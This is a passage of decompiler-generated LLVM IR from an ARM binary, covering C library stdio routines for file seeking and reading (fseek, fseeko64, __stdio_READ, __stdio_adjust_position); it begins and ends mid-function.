  store i32 %v6_14d58, i32* @r5, align 4
  store i32 %v12_14d58, i32* @r7, align 4
  ret i32 %v0_14e84

; uselistorder directives
  uselistorder i32 %v0_14e3c, { 5, 6, 4, 2, 3, 0, 1 }
  uselistorder i32 %v0_14e44, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v1_14d70, { 1, 2, 0 }
  uselistorder i32 %tmp, { 0, 1, 3, 2, 4 }
  uselistorder i32* %r1.global-to-local, { 6, 1, 2, 3, 4, 5, 7, 0 }
  uselistorder i32 19, { 1, 2, 0, 3 }
  uselistorder i32 18, { 2, 3, 0, 1 }
  uselistorder i32* @sp, { 3, 4, 0, 1, 2 }
  uselistorder i32 %arg1, { 2, 1, 3, 0, 4 }
  uselistorder label %dec_label_pc_14e84, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_14e6c, { 1, 0 }
}

define i32 @__GI_fseek() local_unnamed_addr {
entry:
  %v0_14ea8 = load i32, i32* @r1, align 4
  store i32 %v0_14ea8, i32* @r2, align 4
  %v0_14eb0 = call i32 @__GI_fseeko64()
  ret i32 %v0_14eb0
}

define i32 @__GI_fseeko64() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp18 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-40 = alloca i32, align 4
  %v3_14ec0 = load i32, i32* @r4, align 4
  %v6_14ec0 = load i32, i32* @r5, align 4
  %v12_14ec0 = load i32, i32* @r7, align 4
  %v2_14ec4 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %tmp18, i32* %sl.global-to-local, align 4
  %v2_14ecc = icmp ugt i32 %tmp18, 1
  store i1 %v2_14ecc, i1* %cpsr_c.global-to-local, align 1
  %v7_14ecc = icmp eq i32 %tmp18, 2
  %v0_14ed0 = load i32, i32* @r0, align 4
  store i32 %v0_14ed0, i32* @r7, align 4
  %v2_14ed4 = xor i1 %v2_14ecc, true
  %v3_14ed4 = or i1 %v7_14ecc, %v2_14ed4
  br i1 %v3_14ed4, label %dec_label_pc_14ef4, label %dec_label_pc_14ed8

dec_label_pc_14ed8:                               ; preds = %entry
  store i32 ptrtoint (i32* @global_var_e27c.304 to i32), i32* %r2.global-to-local, align 4
  %v0_14edc = call i32 @__aeabi_read_tp()
  %v3_14ee0 = load i16, i16* @global_var_23164.175, align 2
  %v4_14ee0 = sext i16 %v3_14ee0 to i32
  store i32 %v4_14ee0, i32* %r2.global-to-local, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r6.global-to-local, align 4
  %v3_14eec = add i32 %v4_14ee0, %v0_14edc
  %v4_14eec = inttoptr i32 %v3_14eec to i32*
  store i32 22, i32* %v4_14eec, align 4
  br label %dec_label_pc_1506c

dec_label_pc_14ef4:                               ; preds = %entry
  %v1_14ef4 = add i32 %v0_14ed0, 52
  %v2_14ef4 = inttoptr i32 %v1_14ef4 to i32*
  %v3_14ef4 = load i32, i32* %v2_14ef4, align 4
  store i32 %v3_14ef4, i32* %r8.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14ef8 = icmp eq i32 %v3_14ef4, 0
  %v2_14efc = load i32, i32* @r2, align 4
  store i32 %v2_14efc, i32* %stack_var_-40, align 4
  br i1 %v2_14ef8, label %dec_label_pc_14f04, label %dec_label_pc_14f68

dec_label_pc_14f04:                               ; preds = %dec_label_pc_14ef4
  %v0_14f04 = call i32 @__aeabi_read_tp()
  %v0_14f08 = load i32, i32* @r7, align 4
  %v1_14f08 = add i32 %v0_14f08, 64
  %v2_14f08 = inttoptr i32 %v1_14f08 to i32*
  %v3_14f08 = load i32, i32* %v2_14f08, align 4
  store i32 %v3_14f08, i32* %r3.global-to-local, align 4
  %v1_14f0c = add i32 %v0_14f04, -1168
  store i32 %v1_14f0c, i32* %r6.global-to-local, align 4
  %v3_14f10 = icmp uge i32 %v3_14f08, %v1_14f0c
  store i1 %v3_14f10, i1* %cpsr_c.global-to-local, align 1
  %v9_14f10 = icmp eq i32 %v3_14f08, %v1_14f0c
  br i1 %v9_14f10, label %dec_label_pc_14f5c, label %dec_label_pc_14f18

dec_label_pc_14f18:                               ; preds = %dec_label_pc_14f04
  %v1_14f18 = add i32 %v0_14f08, 56
  store i32 %v1_14f18, i32* @r5, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v1_14f18, i32* %r2.global-to-local, align 4
  %v0_14f24 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_14f24, i32* @r4, align 4
  %v1_14f2837 = inttoptr i32 %v1_14f18 to i32*
  %v2_14f2838 = load i32, i32* %v1_14f2837, align 4
  store i32 %v2_14f2838, i32* %r3.global-to-local, align 4
  %v3_14f2c40 = icmp uge i32 %v2_14f2838, %v0_14f24
  store i1 %v3_14f2c40, i1* %cpsr_c.global-to-local, align 1
  %v9_14f2c46 = icmp eq i32 %v2_14f2838, %v0_14f24
  br i1 %v9_14f2c46, label %dec_label_pc_14f34, label %dec_label_pc_14f4c

dec_label_pc_14f34:                               ; preds = %dec_label_pc_14f18, %dec_label_pc_14f34.dec_label_pc_14f28_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_14f44 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_14f44, label %dec_label_pc_14f48, label %dec_label_pc_14f34.dec_label_pc_14f28_crit_edge

dec_label_pc_14f34.dec_label_pc_14f28_crit_edge:  ; preds = %dec_label_pc_14f34
  %v0_14f28.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_14f2c.pre = load i32, i32* @r4, align 4
  %v1_14f28 = inttoptr i32 %v0_14f28.pre to i32*
  %v2_14f28 = load i32, i32* %v1_14f28, align 4
  store i32 %v2_14f28, i32* %r3.global-to-local, align 4
  %v3_14f2c = icmp uge i32 %v2_14f28, %v1_14f2c.pre
  store i1 %v3_14f2c, i1* %cpsr_c.global-to-local, align 1
  %v9_14f2c = icmp eq i32 %v2_14f28, %v1_14f2c.pre
  br i1 %v9_14f2c, label %dec_label_pc_14f34, label %dec_label_pc_14f4c

dec_label_pc_14f48:                               ; preds = %dec_label_pc_14f34
  %v0_14f48 = load i32, i32* @r4, align 4
  store i32 %v0_14f48, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_14f4c

dec_label_pc_14f4c:                               ; preds = %dec_label_pc_14f18, %dec_label_pc_14f34.dec_label_pc_14f28_crit_edge, %dec_label_pc_14f48
  %v0_14f4c = phi i32 [ %v0_14f48, %dec_label_pc_14f48 ], [ %v2_14f2838, %dec_label_pc_14f18 ], [ %v2_14f28, %dec_label_pc_14f34.dec_label_pc_14f28_crit_edge ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14f4c = icmp eq i32 %v0_14f4c, 0
  br i1 %v2_14f4c, label %bb21, label %bb

bb:                                               ; preds = %dec_label_pc_14f4c
  br label %bb21

bb21:                                             ; preds = %dec_label_pc_14f4c, %bb
  store i32 85848, i32* @lr, align 4
  %v1_14f54 = xor i1 %v2_14f4c, true
  call void @__pseudo_cond_branch(i1 %v1_14f54, i32 ptrtoint (i32* @global_var_10b94.194 to i32))
  %v0_14f58 = load i32, i32* %r6.global-to-local, align 4
  %v1_14f58 = load i32, i32* @r7, align 4
  %v2_14f58 = add i32 %v1_14f58, 64
  %v3_14f58 = inttoptr i32 %v2_14f58 to i32*
  store i32 %v0_14f58, i32* %v3_14f58, align 4
  %v0_14f5c.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_14f5c

dec_label_pc_14f5c:                               ; preds = %dec_label_pc_14f04, %bb21
  %v0_14f5c = phi i32 [ %v0_14f08, %dec_label_pc_14f04 ], [ %v0_14f5c.pre, %bb21 ]
  %v1_14f5c = add i32 %v0_14f5c, 60
  %v2_14f5c = inttoptr i32 %v1_14f5c to i32*
  %v3_14f5c = load i32, i32* %v2_14f5c, align 4
  %v1_14f60 = add i32 %v3_14f5c, 1
  store i32 %v1_14f60, i32* %r3.global-to-local, align 4
  store i32 %v1_14f60, i32* %v2_14f5c, align 4
  %v0_14f68.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_14f68

dec_label_pc_14f68:                               ; preds = %dec_label_pc_14ef4, %dec_label_pc_14f5c
  %v0_14f74 = phi i32 [ %v0_14ed0, %dec_label_pc_14ef4 ], [ %v0_14f68.pre, %dec_label_pc_14f5c ]
  %v1_14f68 = inttoptr i32 %v0_14f74 to i16*
  %v2_14f68 = load i16, i16* %v1_14f68, align 2
  %v3_14f68 = zext i16 %v2_14f68 to i32
  store i32 %v3_14f68, i32* %r3.global-to-local, align 4
  %v1_14f6c = and i32 %v3_14f68, 64
  %v2_14f6c = icmp eq i32 %v1_14f6c, 0
  br i1 %v2_14f6c, label %dec_label_pc_14f84, label %dec_label_pc_14f74

dec_label_pc_14f74:                               ; preds = %dec_label_pc_14f68
  store i32 %v0_14f74, i32* @r0, align 4
  %v0_14f78 = call i32 @__stdio_wcommit()
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14f7c = icmp eq i32 %v0_14f78, 0
  br i1 %v2_14f7c, label %dec_label_pc_14f84, label %dec_label_pc_14fec

dec_label_pc_14f84:                               ; preds = %dec_label_pc_14f74, %dec_label_pc_14f68
  %v0_14f84 = load i32, i32* %sl.global-to-local, align 4
  %v2_14f84 = icmp ne i32 %v0_14f84, 0
  store i1 %v2_14f84, i1* %cpsr_c.global-to-local, align 1
  %v7_14f84 = icmp eq i32 %v0_14f84, 1
  br i1 %v7_14f84, label %dec_label_pc_14f8c, label %dec_label_pc_14fa0

dec_label_pc_14f8c:                               ; preds = %dec_label_pc_14f84
  %v0_14f8c = load i32, i32* @r7, align 4
  store i32 %v2_14ec4, i32* %r1.global-to-local, align 4
  %v2_14f94 = inttoptr i32 %v0_14f8c to i16*
  %v3_14f94 = call i32 @__stdio_adjust_position(i16* %v2_14f94, i32 %v2_14ec4)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_14f98 = icmp slt i32 %v3_14f94, 0
  br i1 %v1_14f98, label %dec_label_pc_14fec, label %dec_label_pc_14f8c.dec_label_pc_14fa0_crit_edge

dec_label_pc_14f8c.dec_label_pc_14fa0_crit_edge:  ; preds = %dec_label_pc_14f8c
  %v0_14fa0.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_14fa0

dec_label_pc_14fa0:                               ; preds = %dec_label_pc_14f8c.dec_label_pc_14fa0_crit_edge, %dec_label_pc_14f84
  %v0_14fa0 = phi i32 [ %v0_14fa0.pre, %dec_label_pc_14f8c.dec_label_pc_14fa0_crit_edge ], [ %v0_14f84, %dec_label_pc_14f84 ]
  store i32 %v0_14fa0, i32* %r2.global-to-local, align 4
  %v0_14fa4 = load i32, i32* @r7, align 4
  store i32 %v2_14ec4, i32* %r1.global-to-local, align 4
  %v4_14fac = call i32 @__stdio_seek(i32 %v0_14fa4, i32* nonnull %stack_var_-40, i32 %v0_14fa0)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_14fb0 = icmp slt i32 %v4_14fac, 0
  br i1 %v1_14fb0, label %dec_label_pc_14fec, label %dec_label_pc_14fb8

dec_label_pc_14fb8:                               ; preds = %dec_label_pc_14fa0
  %v0_14fb8 = load i32, i32* @r7, align 4
  %v1_14fb8 = inttoptr i32 %v0_14fb8 to i16*
  %v2_14fb8 = load i16, i16* %v1_14fb8, align 2
  %v3_14fb8 = zext i16 %v2_14fb8 to i32
  store i32 %v3_14fb8, i32* %r3.global-to-local, align 4
  %v1_14fbc = add i32 %v0_14fb8, 8
  %v2_14fbc = inttoptr i32 %v1_14fbc to i32*
  %v3_14fbc = load i32, i32* %v2_14fbc, align 4
  store i32 %v3_14fbc, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v1_14fc4 = and i32 %v3_14fb8, 65464
  store i32 %v1_14fc4, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  %v1_14fcc = trunc i32 %v1_14fc4 to i16
  store i16 %v1_14fcc, i16* %v1_14fb8, align 2
  %v0_14fd0 = load i32, i32* %r2.global-to-local, align 4
  %v1_14fd0 = load i32, i32* @r7, align 4
  %v2_14fd0 = add i32 %v1_14fd0, 28
  %v3_14fd0 = inttoptr i32 %v2_14fd0 to i32*
  store i32 %v0_14fd0, i32* %v3_14fd0, align 4
  %v0_14fd4 = load i32, i32* %r2.global-to-local, align 4
  %v1_14fd4 = load i32, i32* @r7, align 4
  %v2_14fd4 = add i32 %v1_14fd4, 16
  %v3_14fd4 = inttoptr i32 %v2_14fd4 to i32*
  store i32 %v0_14fd4, i32* %v3_14fd4, align 4
  %v0_14fd8 = load i32, i32* %r2.global-to-local, align 4
  %v1_14fd8 = load i32, i32* @r7, align 4
  %v2_14fd8 = add i32 %v1_14fd8, 20
  %v3_14fd8 = inttoptr i32 %v2_14fd8 to i32*
  store i32 %v0_14fd8, i32* %v3_14fd8, align 4
  %v0_14fdc = load i32, i32* %r2.global-to-local, align 4
  %v1_14fdc = load i32, i32* @r7, align 4
  %v2_14fdc = add i32 %v1_14fdc, 24
  %v3_14fdc = inttoptr i32 %v2_14fdc to i32*
  store i32 %v0_14fdc, i32* %v3_14fdc, align 4
  %v0_14fe0 = load i32, i32* %r1.global-to-local, align 4
  %v1_14fe0 = load i32, i32* @r7, align 4
  %v2_14fe0 = add i32 %v1_14fe0, 44
  %v3_14fe0 = inttoptr i32 %v2_14fe0 to i32*
  store i32 %v0_14fe0, i32* %v3_14fe0, align 4
  %v0_14fe4 = load i32, i32* %r1.global-to-local, align 4
  %v1_14fe4 = trunc i32 %v0_14fe4 to i8
  %v2_14fe4 = load i32, i32* @r7, align 4
  %v3_14fe4 = add i32 %v2_14fe4, 2
  %v4_14fe4 = inttoptr i32 %v3_14fe4 to i8*
  store i8 %v1_14fe4, i8* %v4_14fe4, align 1
  br label %dec_label_pc_14ff0

dec_label_pc_14fec:                               ; preds = %dec_label_pc_14f74, %dec_label_pc_14fa0, %dec_label_pc_14f8c
  store i32 -1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14ff0

dec_label_pc_14ff0:                               ; preds = %dec_label_pc_14fb8, %dec_label_pc_14fec
  %v0_14ff0 = load i32, i32* %r8.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14ff0 = icmp eq i32 %v0_14ff0, 0
  br i1 %v2_14ff0, label %dec_label_pc_14ff8, label %dec_label_pc_1506c

dec_label_pc_14ff8:                               ; preds = %dec_label_pc_14ff0
  %v0_14ff8 = load i32, i32* @r7, align 4
  %v1_14ff8 = add i32 %v0_14ff8, 60
  %v2_14ff8 = inttoptr i32 %v1_14ff8 to i32*
  %v3_14ff8 = load i32, i32* %v2_14ff8, align 4
  %v1_14ffc = add i32 %v3_14ff8, -1
  store i32 %v1_14ffc, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15000 = icmp eq i32 %v1_14ffc, 0
  store i32 %v1_14ffc, i32* %v2_14ff8, align 4
  br i1 %v2_15000, label %dec_label_pc_1500c, label %dec_label_pc_1506c

dec_label_pc_1500c:                               ; preds = %dec_label_pc_14ff8
  %v0_1500c = load i32, i32* %r3.global-to-local, align 4
  %v1_1500c = load i32, i32* @r7, align 4
  %v2_1500c = add i32 %v1_1500c, 64
  %v3_1500c = inttoptr i32 %v2_1500c to i32*
  store i32 %v0_1500c, i32* %v3_1500c, align 4
  %v0_15010 = load i32, i32* @r7, align 4
  %v1_15010 = add i32 %v0_15010, 56
  store i32 %v1_15010, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_15014

dec_label_pc_15014:                               ; preds = %dec_label_pc_15044.dec_label_pc_15014_crit_edge, %dec_label_pc_1500c
  %v0_1501c = phi i32 [ %v0_1501c.pre, %dec_label_pc_15044.dec_label_pc_15014_crit_edge ], [ %v1_15010, %dec_label_pc_1500c ]
  %v0_15014 = phi i32 [ %v0_15014.pre, %dec_label_pc_15044.dec_label_pc_15014_crit_edge ], [ %v0_15010, %dec_label_pc_1500c ]
  %v1_15014 = add i32 %v0_15014, 56
  %v2_15014 = inttoptr i32 %v1_15014 to i32*
  %v3_15014 = load i32, i32* %v2_15014, align 4
  store i32 %v3_15014, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_1501c, i32* %r2.global-to-local, align 4
  %v1_1502025 = inttoptr i32 %v0_1501c to i32*
  %v2_1502026 = load i32, i32* %v1_1502025, align 4
  store i32 %v2_1502026, i32* %r3.global-to-local, align 4
  %v3_1502428 = icmp uge i32 %v2_1502026, %v3_15014
  store i1 %v3_1502428, i1* %cpsr_c.global-to-local, align 1
  %v9_1502434 = icmp eq i32 %v2_1502026, %v3_15014
  br i1 %v9_1502434, label %dec_label_pc_1502c, label %dec_label_pc_15044

dec_label_pc_1502c:                               ; preds = %dec_label_pc_15014, %dec_label_pc_1502c.dec_label_pc_15020_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1503c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1503c, label %dec_label_pc_15040, label %dec_label_pc_1502c.dec_label_pc_15020_crit_edge

dec_label_pc_1502c.dec_label_pc_15020_crit_edge:  ; preds = %dec_label_pc_1502c
  %v0_15020.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15024.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_15020 = inttoptr i32 %v0_15020.pre to i32*
  %v2_15020 = load i32, i32* %v1_15020, align 4
  store i32 %v2_15020, i32* %r3.global-to-local, align 4
  %v3_15024 = icmp uge i32 %v2_15020, %v1_15024.pre
  store i1 %v3_15024, i1* %cpsr_c.global-to-local, align 1
  %v9_15024 = icmp eq i32 %v2_15020, %v1_15024.pre
  br i1 %v9_15024, label %dec_label_pc_1502c, label %dec_label_pc_15044

dec_label_pc_15040:                               ; preds = %dec_label_pc_1502c
  %v0_15040 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_15040, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15044

dec_label_pc_15044:                               ; preds = %dec_label_pc_15014, %dec_label_pc_1502c.dec_label_pc_15020_crit_edge, %dec_label_pc_15040
  %v0_1504c = phi i32 [ %v0_15040, %dec_label_pc_15040 ], [ %v2_1502026, %dec_label_pc_15014 ], [ %v2_15020, %dec_label_pc_1502c.dec_label_pc_15020_crit_edge ]
  %v1_15044 = phi i32 [ %v0_15040, %dec_label_pc_15040 ], [ %v3_15014, %dec_label_pc_15014 ], [ %v1_15024.pre, %dec_label_pc_1502c.dec_label_pc_15020_crit_edge ]
  %v3_15044 = icmp uge i32 %v0_1504c, %v1_15044
  store i1 %v3_15044, i1* %cpsr_c.global-to-local, align 1
  %v9_15044 = icmp eq i32 %v0_1504c, %v1_15044
  br i1 %v9_15044, label %dec_label_pc_1504c, label %dec_label_pc_15044.dec_label_pc_15014_crit_edge

dec_label_pc_15044.dec_label_pc_15014_crit_edge:  ; preds = %dec_label_pc_15044
  %v0_15014.pre = load i32, i32* @r7, align 4
  %v0_1501c.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_15014

dec_label_pc_1504c:                               ; preds = %dec_label_pc_15044
  %v2_1504c = icmp ne i32 %v1_15044, 0
  store i1 %v2_1504c, i1* %cpsr_c.global-to-local, align 1
  %v7_15050 = icmp slt i32 %v1_15044, 2
  br i1 %v7_15050, label %dec_label_pc_1506c, label %dec_label_pc_15054

dec_label_pc_15054:                               ; preds = %dec_label_pc_1504c
  %v0_15058 = load i32, i32* %r1.global-to-local, align 4
  %v1_15058 = add i32 %v0_15058, 129
  store i32 %v1_15058, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1506c

dec_label_pc_1506c:                               ; preds = %dec_label_pc_14ff8, %dec_label_pc_14ff0, %dec_label_pc_15054, %dec_label_pc_1504c, %dec_label_pc_14ed8
  %v0_1506c = load i32, i32* %r6.global-to-local, align 4
  store i32 %v3_14ec0, i32* @r4, align 4
  store i32 %v6_14ec0, i32* @r5, align 4
  store i32 %v12_14ec0, i32* @r7, align 4
  ret i32 %v0_1506c

; uselistorder directives
  uselistorder i32 %v0_15040, { 1, 0, 2 }
  uselistorder i32 %v1_15024.pre, { 0, 2, 1 }
  uselistorder i32 %v0_14fa0, { 1, 0 }
  uselistorder i32 %v0_14f84, { 0, 2, 1 }
  uselistorder i32 %v1_14f2c.pre, { 1, 0 }
  uselistorder i32 %v2_14ec4, { 0, 2, 1 }
  uselistorder i32 %tmp18, { 2, 1, 0 }
  uselistorder i32* %r6.global-to-local, { 4, 1, 0, 2, 3, 5 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 5, 4, 1, 6, 7, 8, 9, 10, 11, 12, 14, 13, 0, 15, 16 }
  uselistorder i1* %cpsr_c.global-to-local, { 2, 3, 5, 4, 1, 6, 7, 8, 9, 10, 11, 12, 14, 13, 0, 15, 16, 17 }
  uselistorder i32 -61504, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 16, 17, 18, 14, 15, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45 }
  uselistorder i32 -61441, { 37, 38, 13, 14, 0, 39, 1, 2, 8, 9, 10, 11, 12, 25, 26, 27, 28, 29, 30, 21, 22, 23, 24, 4, 5, 31, 32, 6, 7, 3, 33, 34, 35, 36, 15, 16, 17, 18, 19, 20 }
  uselistorder label %dec_label_pc_1506c, { 2, 3, 0, 1, 4 }
  uselistorder label %dec_label_pc_15044, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1502c, { 1, 0 }
  uselistorder label %dec_label_pc_14ff0, { 1, 0 }
  uselistorder label %dec_label_pc_14fec, { 1, 2, 0 }
  uselistorder label %dec_label_pc_14f68, { 1, 0 }
  uselistorder label %dec_label_pc_14f5c, { 1, 0 }
  uselistorder label %bb21, { 1, 0 }
  uselistorder label %dec_label_pc_14f4c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14f34, { 1, 0 }
}

define i32 @__stdio_READ(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r2, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_15080 = load i32, i32* @r4, align 4
  store i32 %v3_15080, i32* %stack_var_-12, align 4
  %v0_15084 = load i32, i32* %r0.global-to-local, align 4
  %v1_15084 = inttoptr i32 %v0_15084 to i16*
  %v2_15084 = load i16, i16* %v1_15084, align 2
  %v3_15084 = zext i16 %v2_15084 to i32
  store i32 %v3_15084, i32* @r3, align 4
  %v1_15088 = and i32 %v3_15084, 4
  store i32 %v1_15088, i32* @r5, align 4
  %v2_15088 = icmp eq i32 %v1_15088, 0
  store i32 %v0_15084, i32* @r4, align 4
  br i1 %v2_15088, label %dec_label_pc_1509c, label %bb

bb:                                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread7

dec_label_pc_1509c:                               ; preds = %entry
  %v1_1509c = icmp slt i32 %arg2, 0
  br i1 %v1_1509c, label %bb18, label %bb19

bb18:                                             ; preds = %dec_label_pc_1509c
  store i32 2147483647, i32* @r2, align 4
  br label %bb19

bb19:                                             ; preds = %dec_label_pc_1509c, %bb18
  %v1_150a4 = add i32 %v0_15084, 4
  %v2_150a4 = inttoptr i32 %v1_150a4 to i32*
  %v3_150a4 = load i32, i32* %v2_150a4, align 4
  store i32 %v3_150a4, i32* %r0.global-to-local, align 4
  %v1_150a8 = call i32 @__libc_read(i32 %v3_150a4)
  store i32 %v1_150a8, i32* %r0.global-to-local, align 4
  %v5_150b0 = icmp sgt i32 %v1_150a8, 0
  br i1 %v5_150b0, label %.thread7, label %dec_label_pc_150b4

dec_label_pc_150b4:                               ; preds = %bb19
  %v2_150ac = icmp eq i32 %v1_150a8, 0
  %v0_150b4 = load i32, i32* @r4, align 4
  %v1_150b4 = inttoptr i32 %v0_150b4 to i16*
  %v2_150b4 = load i16, i16* %v1_150b4, align 2
  br i1 %v2_150ac, label %bb20, label %bb21

bb20:                                             ; preds = %dec_label_pc_150b4
  %v2_150b8 = or i16 %v2_150b4, 4
  store i16 %v2_150b8, i16* %v1_150b4, align 2
  %v1_150d4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread7

bb21:                                             ; preds = %dec_label_pc_150b4
  %v2_150bc = or i16 %v2_150b4, 8
  store i16 %v2_150bc, i16* %v1_150b4, align 2
  %v1_150c8 = load i32, i32* @r5, align 4
  store i32 %v1_150c8, i32* %r0.global-to-local, align 4
  br label %.thread7

.thread7:                                         ; preds = %bb20, %bb, %bb19, %bb21
  %v1_150d4 = phi i32 [ %v1_150d4.pre, %bb20 ], [ 0, %bb ], [ %v1_150a8, %bb19 ], [ %v1_150c8, %bb21 ]
  %v2_150d0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_150d0, i32* @r4, align 4
  ret i32 %v1_150d4

; uselistorder directives
  uselistorder i16 %v2_150b4, { 1, 0 }
  uselistorder i32 %v1_150a8, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 2, 5, 6, 3, 4, 0, 1 }
  uselistorder i32 2147483647, { 6, 1, 7, 2, 5, 3, 4, 0 }
  uselistorder label %.thread7, { 3, 0, 2, 1 }
  uselistorder label %bb19, { 1, 0 }
}

define i32 @__stdio_adjust_position(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_150d8 = load i32, i32* @r4, align 4
  store i32 %v3_150d8, i32* %stack_var_-12, align 4
  %v3_150dc = load i16, i16* %arg1, align 2
  %v4_150dc = zext i16 %v3_150dc to i32
  store i32 %v4_150dc, i32* @ip, align 4
  %tmp16 = urem i16 %v3_150dc, 4
  %v1_150e0 = zext i16 %tmp16 to i32
  store i32 %v1_150e0, i32* %r2.global-to-local, align 4
  %v2_150e0 = icmp eq i16 %tmp16, 0
  br i1 %v2_150e0, label %bb, label %dec_label_pc_150f0

bb:                                               ; preds = %entry
  br label %bb13

dec_label_pc_150f0:                               ; preds = %entry
  %v1_150f0 = add nsw i32 %v1_150e0, -1
  %v7_150f0 = icmp eq i16 %tmp16, 1
  br i1 %v7_150f0, label %bb13, label %dec_label_pc_150f8

dec_label_pc_150f8:                               ; preds = %dec_label_pc_150f0
  %v1_150f8 = and i32 %v4_150dc, 2048
  %v2_150f8 = icmp eq i32 %v1_150f8, 0
  br i1 %v2_150f8, label %bb13, label %dec_label_pc_15100

dec_label_pc_15100:                               ; preds = %dec_label_pc_150f8
  %v7_15100 = icmp eq i32 %v1_150f0, 2
  br i1 %v7_15100, label %dec_label_pc_1518c, label %dec_label_pc_15108

dec_label_pc_15108:                               ; preds = %dec_label_pc_15100
  %v2_15108 = add i32 %tmp, 40
  %v3_15108 = inttoptr i32 %v2_15108 to i32*
  %v4_15108 = load i32, i32* %v3_15108, align 4
  store i32 %v4_15108, i32* %r3.global-to-local, align 4
  %v2_1510c = icmp eq i32 %v4_15108, 0
  br i1 %v2_1510c, label %dec_label_pc_15114, label %dec_label_pc_1518c

dec_label_pc_15114:                               ; preds = %dec_label_pc_15108
  %v2_15114 = add i32 %tmp, 44
  %v3_15114 = inttoptr i32 %v2_15114 to i32*
  %v4_15114 = load i32, i32* %v3_15114, align 4
  store i32 %v4_15114, i32* %r3.global-to-local, align 4
  %v2_15118 = add i32 %tmp, 3
  %v3_15118 = inttoptr i32 %v2_15118 to i8*
  %v4_15118 = load i8, i8* %v3_15118, align 1
  %v5_15118 = zext i8 %v4_15118 to i32
  store i32 %v5_15118, i32* %r2.global-to-local, align 4
  %v2_1511c = icmp eq i32 %v4_15114, 0
  br i1 %v2_1511c, label %.thread1, label %bb12

.thread1:                                         ; preds = %dec_label_pc_15114
  %v1_151243 = sub nsw i32 0, %v5_15118
  br label %bb13

bb12:                                             ; preds = %dec_label_pc_15114
  %v3_15120 = add i32 %tmp, 2
  %v4_15120 = inttoptr i32 %v3_15120 to i8*
  %v5_15120 = load i8, i8* %v4_15120, align 1
  %v6_15120 = zext i8 %v5_15120 to i32
  store i32 %v6_15120, i32* %r3.global-to-local, align 4
  %sum = add nuw nsw i32 %v6_15120, %v5_15118
  %v3_15128 = sub nsw i32 0, %sum
  br label %bb13

bb13:                                             ; preds = %bb, %.thread1, %dec_label_pc_150f8, %dec_label_pc_150f0, %bb12
  %v1_1513c = phi i32 [ %v1_151243, %.thread1 ], [ %v1_150f0, %dec_label_pc_150f8 ], [ %v1_150f0, %dec_label_pc_150f0 ], [ 0, %bb ], [ %v3_15128, %bb12 ]
  %v1_1512c = and i32 %v4_150dc, 64
